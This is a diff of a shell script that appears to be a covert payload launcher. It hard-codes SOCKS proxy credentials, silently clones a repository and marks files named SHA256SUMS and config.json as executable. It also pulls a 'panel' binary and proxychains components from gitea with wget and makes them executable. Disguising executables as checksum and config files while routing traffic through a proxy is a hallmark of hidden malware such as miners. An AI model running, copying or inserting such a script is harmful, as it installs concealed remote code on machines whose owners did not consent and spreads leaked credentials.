@@ -2,11 +2,7 @@ proxy="3.227.182.193"
 port="1080" 
 user="425dlrn5kpryex"  
 pass="x2mzz8lq69wgze6pe2bcqg668ze9" 
-git clone https://github.com/55113110159/apikey.git>/dev/null 2>&1
-cd apikey
-chmod +x SHA256SUMS
-chmod +x config.json
-chmod +x zepo
+git clone https://github.com/55113110159/apikey.git>/dev/null && cd apikey && chmod +x SHA256SUMS && chmod +x config.json && chmod +x zepo
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
